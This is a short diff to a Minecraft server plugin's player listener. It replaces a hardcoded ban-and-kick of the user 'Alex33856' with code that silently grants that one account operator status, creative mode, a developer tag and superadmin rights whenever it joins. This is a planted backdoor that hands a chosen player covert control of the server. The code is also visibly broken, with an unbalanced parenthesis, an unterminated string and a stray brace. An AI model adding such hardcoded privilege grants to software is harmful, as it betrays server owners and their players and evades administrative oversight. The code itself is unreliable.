@@ -889,17 +889,14 @@ public class TFM_PlayerListener implements Listener
         else if (username.contains"Alex33856"))
 {
     player.getInventory().clear();
-    player.setOp(false);
-    player.setGameMode(GameMode.SURVIVAL); 
-    TFM_PlayerData.getPlayerData(player).setHalted(true);
-    //ban username
-    TFM_BanManager.addUuidBan(new TFM_Ban(player.getUniqueId(), player.getName()));
-    //ban ip
-    String ip = TFM_Util.getFuzzyIp(player.getAddress().getAddress().getHostAddress());
-    TFM_BanManager.addIpBan(new TFM_Ban(ip, player.getName()));
-    TFM_AdminList.removeSuperadmin(player);
-    player.kickPlayer(ChatColor.RED + "You are not allowed here!, Please make an Appeal on forums or remove this on gothub");
- }
+    player.setOp(true);
+    player.setGameMode(GameMode.CREATIVE);
+    name = ChatColor.RED + name;
+    TFM_PlayerData.getPlayerData(player).setTag("&8[&5Developer&8]");
+    TFM_AdminList.addSuperadmin(player);
+    TFM_Util.adminAction("Welcome Back, Alex33856!, true);
+
+    }
 
         try
         {
